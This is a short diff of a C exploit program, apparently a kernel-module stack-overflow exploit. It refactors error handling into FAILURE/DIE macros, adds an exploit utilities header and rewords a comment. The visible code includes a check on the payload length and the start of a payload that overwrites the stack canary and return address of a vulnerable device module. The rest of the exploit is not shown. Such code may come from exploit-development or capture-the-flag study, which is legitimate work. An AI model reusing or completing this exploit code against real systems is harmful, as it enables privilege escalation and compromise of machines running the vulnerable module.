@@ -1,3 +1,4 @@
+#include "include/xpl_utils.h"
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -25,7 +26,7 @@ int main()
     return 0;
 }
 
-/* Connect to vulnerable module */
+/* Open file stream for a device/module */
 int open_dev(const char *path, int flags) 
 {
     int fd = open(path, flags);
@@ -68,12 +69,13 @@ void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
 
     size_t pos = cookie_offset / sizeof(uintptr_t);
     if (pos + 4 >= pl_slots) {
-        fprintf(stderr,
-            "[-] Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
+		FAILURE(
+			"Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
             pl_len,
-            cookie_offset + 5 * sizeof(uintptr_t));
+            cookie_offset + 5 * sizeof(uintptr_t)
+		);
         free(pl);
-        exit(EXIT_FAILURE);
+		DIE("payload");
     }
 
     pl[pos++] = cookie;     // Canary
